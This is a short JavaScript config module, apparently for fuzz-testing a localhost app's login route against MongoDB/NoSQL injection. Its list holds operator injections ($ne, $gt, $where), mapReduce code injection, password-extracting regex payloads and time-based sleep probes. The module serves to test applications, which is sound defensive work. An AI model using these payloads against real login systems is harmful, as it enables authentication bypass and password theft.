const TEST_APP_CONFIG = {
    'app-url': 'http://localhost:3006/',
    'routes': {
        'login': {
            'url': 'login',
            'successContent': 'Welcome to your profile'
        }
    }
}

const FUZZ_TESTS = [
    `{ $ne: 1 }`,
    `', $or: [ {}, { 'a':'a`,
    `' } ], $comment:'successful MongoDB injection'`,
    `db.injection.insert({success:1});`,
    `db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1`,
    `true, $where: '1 == 1'`,
    `, $where: '1 == 1'`,
    `$where: '1 == 1'`,
    `', $where: '1 == 1'`,
    `1, $where: '1 == 1'`,
    `|| 1==1`,
    `' || 'a'=='a`,
    `' && this.password.match(/.*/)//+%00`,
    `' && this.passwordzz.match(/.*/)//+%00`,
    `'%20%26%26%20this.password.match(/.*/)//+%00`,
    `'%20%26%26%20this.passwordzz.match(/.*/)//+%00`,
    `{$gt: ''}`,
    `{"$gt": ""}`,
    `[$ne]=1`,
    `';sleep(5000);`,
    `';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);`,
    `{$nin: [""]}}`
];

module.exports = {
    testApp: TEST_APP_CONFIG,
    fuzzTests: FUZZ_TESTS
}